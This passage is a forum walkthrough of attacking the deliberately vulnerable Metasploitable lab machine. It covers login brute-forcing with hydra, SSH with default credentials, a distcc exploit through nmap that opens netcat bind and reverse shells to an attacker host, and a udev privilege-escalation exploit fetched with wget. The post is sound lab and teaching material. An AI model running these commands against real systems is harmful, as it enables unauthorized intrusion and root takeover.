+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/d/d98455f51d5a9e9f0ca0facc9a70a0d27a0c2515.PNG" data-download-href="/uploads/short-url/v2f8CY7xcazoYyYpuwR8Awdyh8x.PNG?dl=1" title="12.PNG" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/d/d98455f51d5a9e9f0ca0facc9a70a0d27a0c2515.PNG" width="690" height="189"></a></div><p></p>
+<p><strong>### PostgreSQL ###</strong><br>
+<code>hydra -L users_metasploitable -e nsr postgres://10.11.1.10 -q -o postgres_login</code></p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/3/35ca914f4ccd90491b01ad5a45afa0b085abf87f.PNG" data-download-href="/uploads/short-url/7FRiUBYu5V17GakaACkrhUqEepp.PNG?dl=1" title="13.PNG" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/3/35ca914f4ccd90491b01ad5a45afa0b085abf87f.PNG" width="690" height="188"></a></div><p></p>
+<p>Very nice!<br>
+There are a lot of accounts we can use to login on the machine. <img src="https://d.clarkee.co.uk/images/emoji/twitter/smiley.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"><br>
+But first let me compare the results to one single list.</p>
+<p><code>cat ftp_login mysql_login postgres_login smb_login ssh_login telnet_login | grep host | column -t &gt; metasploitable_accounts</code></p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/9/9e74f66bcfb970721bbf0af47667ad6c733d2f83.PNG" data-download-href="/uploads/short-url/mBM1X7kEib6RschRTJRDTSXJYZ5.png?dl=1" title="14.PNG" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/9/9e74f66bcfb970721bbf0af47667ad6c733d2f83.PNG" width="690" height="362"></a></div><p></p>
+<p>As you can see, it was a quick task and we have some accounts we can use to login but the user <strong>msfadmin</strong> looks like it could be in the sudoers group. So I will start with this user.</p>
+<h1><a name="p-16696-h-9-os-detection-6" class="anchor" href="https://d.clarkee.co.uk#p-16696-h-9-os-detection-6"></a>9. OS Detection</h1>
+<p>To identify the exact OS informations I’ll start just now to enumerate the exact OS, because the banners of the results from <strong>nmap</strong> can be false positive or just not exactly enough. So I have to identify the exact OS version manually using  ssh.</p>
+<p>So let me login using the SSH service:<br>
+<code># ssh msfadmin@10.11.1.10</code><br>
+<code>.. (yes/no)? yes</code><br>
+<code>... password: msfadmin</code><br>
+<code>$ uname -a</code></p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/6/6279c09a89a0aa6b0da3b2f08a2b423a074999b5.PNG" data-download-href="/uploads/short-url/e39E0DKRjx2TrSnJbh25IC3qfdP.PNG?dl=1" title="15.PNG" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/6/6279c09a89a0aa6b0da3b2f08a2b423a074999b5.PNG" width="690" height="325"></a></div><p></p>
+<p>Now lets take a look if we have access to run a shell with root privileges.</p>
+<p><code>$ sudo -i</code><br>
+<code>password: msfadmin</code></p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/0/0e783b6b44871e1a3c3fa7f08ce0435de3da9c40.PNG" data-download-href="/uploads/short-url/240hoWWjLIekGwv8vFpcRrR0ICI.PNG?dl=1" title="19.PNG" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/0/0e783b6b44871e1a3c3fa7f08ce0435de3da9c40.PNG" width="690" height="298"></a></div><p></p>
+<h1><a name="p-16696-one-of-a-lot-ways-are-done-7" class="anchor" href="https://d.clarkee.co.uk#p-16696-one-of-a-lot-ways-are-done-7"></a>One of a lot ways are done!</h1>
+<p>Now I have access to a full privileged account and I’m controlling the system. There exist more other ways to pwn this machine. I showed you the first way I tried out.</p>
+<p>Let’s see if I can break into using another way.</p>
+<h1><a name="p-16696-h-10-simple-vulnerability-detection-8" class="anchor" href="https://d.clarkee.co.uk#p-16696-h-10-simple-vulnerability-detection-8"></a>10. Simple Vulnerability Detection</h1>
+<p>What I will do is a simple vulnerability scan with <strong>nmap</strong>.</p>
+<p><code># nmap --script vuln 10.11.1.10 -p- --open</code></p>
+<p>This scan shows me a lot of vulnerable stuff but the most of them are SSL or DOS vulnerabilities. I picked up the <strong>distcc</strong> daemon because the vulnerability seems to be exploitable.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/6/6a7b79331b915dfb106ec105fc424180532e83e8.PNG" data-download-href="/uploads/short-url/fbZ9s9iolhf4OLjCMTge62UL7v2.PNG?dl=1" title="20.PNG" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/6/6a7b79331b915dfb106ec105fc424180532e83e8.PNG" width="690" height="312"></a></div><p></p>
+<h1><a name="p-16696-h-12-exploit-research-9" class="anchor" href="https://d.clarkee.co.uk#p-16696-h-12-exploit-research-9"></a>12. Exploit Research</h1>
+<p>I found an exploit by using <strong>searchsploit</strong> pretty fast. There is just one result.</p>
+<p><code># searchsploit distcc</code></p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/7/74a65c8a4afbda233d1cf2257ab5df918c255a73.PNG" data-download-href="/uploads/short-url/gDVOuALJ2jDuAPODzfZhx7zofET.PNG?dl=1" title="21.PNG" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/7/74a65c8a4afbda233d1cf2257ab5df918c255a73.PNG" width="690" height="115"></a></div><p></p>
+<p>Mh. The exploit is handled by MSF and I <strong>don’t</strong> want to use it.<br>
+So let me think a little bit. Did I missed something?<br>
+How did I found this vulnerability? → Using <strong>Nmap</strong>.<br>
+Ok. I used a script for that.<br>
+So let me take a look one more time at the results.</p>
+<p>Oh.. I overlooked that the script (<code>distcc-cve2004-2687.nse</code>) used the <code>id</code> command for the “Extra Information” which shows me the <strong>uid</strong> of the current user. <img src="https://d.clarkee.co.uk/images/emoji/twitter/slightly_frowning_face.png?v=15" title=":slightly_frowning_face:" class="emoji" alt=":slightly_frowning_face:" loading="lazy" width="20" height="20"> * <em>shame</em> *<br>
+So it looks like the <strong>Nmap</strong> sent this command to this service. Let me take a look over the documentation of this script from the homepage.<br>
+NSE-doc: <a href="https://nmap.org/nsedoc/scripts/distcc-cve2004-2687.html" rel="noopener nofollow ugc">distcc-cve2004-2687.nse</a></p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/f/ff3d7acf7ccbc4b438e003e6014f1eb58da18015.PNG" width="564" height="64"></p>
+<h1><a name="p-16696-h-14-exploitation-10" class="anchor" href="https://d.clarkee.co.uk#p-16696-h-14-exploitation-10"></a>14. Exploitation</h1>
+<p>Let me change it to possibly get a bind shell using <strong>netcat</strong> at first and then try to connect to it.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/5/5e73ce0db13acb02b9e1f28b7d7403066e9a0016.PNG" data-download-href="/uploads/short-url/dtyZzm2jsxUwBeMxIc6cb1RLw8K.PNG?dl=1" title="23.PNG" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/5/5e73ce0db13acb02b9e1f28b7d7403066e9a0016.PNG" width="542" height="499"></a></div><p></p>
+<p>Nice! Bind shell works and additional I found out the machine has netcat installed. Let me see if a reverse shell works too.<br>
+So I setup a listener on port 6666 and then run the <strong>nmap-script</strong> with the cmd for a reverse shell.</p>
+<p><code># nmap 10.11.1.10 -p 3632 --script distcc-cve2004-2687.nse --script-args="distcc-cve2004-2687.cmd='nc -nv 10.11.1.11 6666 -e /bin/sh'"</code></p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/c/c3e99963c0f29de3b67fbd5647c273d7e40c1858.PNG" data-download-href="/uploads/short-url/rX7ACwXRGRGV96Ctb2UQAEXmPLG.PNG?dl=1" title="39.PNG" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/c/c3e99963c0f29de3b67fbd5647c273d7e40c1858.PNG" width="690" height="357"></a></div><p></p>
+<p>Very nice! Now I have a reverse shell.<br>
+Now I want to spawn a TTY using python.</p>
+<p><code>python -c 'import pty; pty.spawn("/bin/sh")'</code></p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/2/283b92d7f58fb53d13a0b36138e01e5d296fddfc.PNG" width="458" height="174"></p>
+<h1><a name="p-16696-h-15-post-enumeration-11" class="anchor" href="https://d.clarkee.co.uk#p-16696-h-15-post-enumeration-11"></a>15. Post-Enumeration</h1>
+<p>Now I want to get root without interactive mode for sudo. So I have to enumerate some stuff.</p>
+<p><code>$ uname -a</code><br>
+<code>$ cat /proc/version</code></p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/3/366db23c4a441515932b3a26ddb78fc4c2b97516.PNG" data-download-href="/uploads/short-url/7LuO0b8QxEE6JyTSFrLMzzuxjYa.PNG?dl=1" title="30.PNG" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/3/366db23c4a441515932b3a26ddb78fc4c2b97516.PNG" width="690" height="119"></a></div><p></p>
+<p>The kernel &amp; OS version seems to be outdated. * <em>.. You don’t say..</em> *<br>
+I take a quick search on google to find an privilege escalation exploit especially for this version.<br>
+So I search for <strong>Ubuntu 4.2.3-2ubuntu7</strong>. Google shows me the name of this version called Hardy.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/9/989a50e19359762fe8a30e503766f7e1e0263aae.PNG" width="603" height="29"></p>
+<p>My next step is to google for this version name. And you can see a few interesting results.<br>
+I searched a little bit about every exploit and found the <a href="http://www.cvedetails.com/cve/cve-2009-1185" rel="noopener nofollow ugc">CVE-2009-1185</a> very pretty. I will try it out. In the results before I found it on the <a href="https://www.exploit-db.com/exploits/8572/" rel="noopener nofollow ugc">exploit-db</a>. So maybe I have it locally already.</p>
+<p><code>searchsploit 8572 linux</code></p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/b/bdab2a221a6940893dfaa69e27b8e543074d5d5a.PNG" data-download-href="/uploads/short-url/r3SXxytOM1qdKsCvsbucHJfGLbQ.PNG?dl=1" title="32.PNG" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/b/bdab2a221a6940893dfaa69e27b8e543074d5d5a.PNG" width="690" height="123"></a></div><p></p>
+<p>Nice!</p>
+<h1><a name="p-16696-h-16-privilege-escalation-12" class="anchor" href="https://d.clarkee.co.uk#p-16696-h-16-privilege-escalation-12"></a>16. Privilege Escalation</h1>
+<p>Let’s copy the exploit to my directory.</p>
+<p><code># locate 8572.c</code><br>
+<code># cp /usr/share/exploitdb/platforms/lin_x86-64/local/8572.c privescal.c</code></p>
+<p>I want to take a look inside the code to see if I have to take note for some configurations or usage.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/3/3404c616628ee18c68f4bdbd7e0a708ada61f1bd.PNG" data-download-href="/uploads/short-url/7qb3ub37QDqB0aHHYTf52q5dr6R.PNG?dl=1" title="34.PNG" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/3/3404c616628ee18c68f4bdbd7e0a708ada61f1bd.PNG" width="690" height="105"></a></div><p></p>
+<p>So I have to pay attention to</p>
+<ol>
+<li>right <strong>PID of udevd</strong> (PID - 1 as argv[1]),</li>
+<li><strong>/tmp/run</strong> and</li>
+<li>the <strong>payload</strong> inside it.</li>
+</ol>
+<p>Simple usage.<br>
+But before I can transfer this exploit I have to setup a basic Python Webserver on port 8080.</p>
+<p><code># python -m SimpleHTTPServer 8080</code></p>
+<p>After that I use the reverse shell to get the file with <strong>wget</strong> from my machine, compile the code, add my payload to /tmp/run and look for the PID.</p>
+<p><code>$ wget http://10.11.1.11:8080/privescal.c</code><br>
+<code>$ gcc privescal.c -o privs</code><br>
+<code>$ echo '#!/bin/sh\n/bin/netcat 10.11.1.11 5555 -e /bin/sh' &gt; /tmp/run</code><br>
+<code>$ ps aux | grep udev</code></p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/e/ebdc374cfe43f923aabc6f39b284393dca9f4d02.PNG" data-download-href="/uploads/short-url/xEw10gL5DomLkhRENx7wWEYFZBw.PNG?dl=1" title="38.PNG" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/e/ebdc374cfe43f923aabc6f39b284393dca9f4d02.PNG" width="690" height="288"></a></div><p></p>
+<p>Now I will use the founded PID  - 1  (<strong>2575</strong>)  for this exploit.</p>
+<p>After starting my listener I’m ready to catch the shell…</p>
+<p><code># nc -nlvp 5555</code><br>
+<code>$ ./privs 2575</code></p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/0/056d14b78a41e36e4747c738c72c80dae8a52864.PNG" data-download-href="/uploads/short-url/M05IfIhqME8Bd9yI75XC3ghX1y.png?dl=1" title="39.PNG" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/0/056d14b78a41e36e4747c738c72c80dae8a52864.PNG" width="690" height="452"></a></div><p></p>
+<h1><a name="p-16696-done-13" class="anchor" href="https://d.clarkee.co.uk#p-16696-done-13"></a>Done!</h1>
+<blockquote>
+<p>If you have some advice or recommendation to improve my methodology, or want me to add more ways to it so feel free and just tell me that.</p>
+</blockquote>
+<p>Thx and have a nice day!<br>
+Cry0l1t3</p>
+          <p><a href="https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964/1</link>
+        <pubDate>Thu, 19 Oct 2017 08:56:07 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-3964-1</guid>
+        <source url="https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964.rss">Metasploitable 1 - Walkthrough</source>
+      </item>
+  </channel>
+</rss>
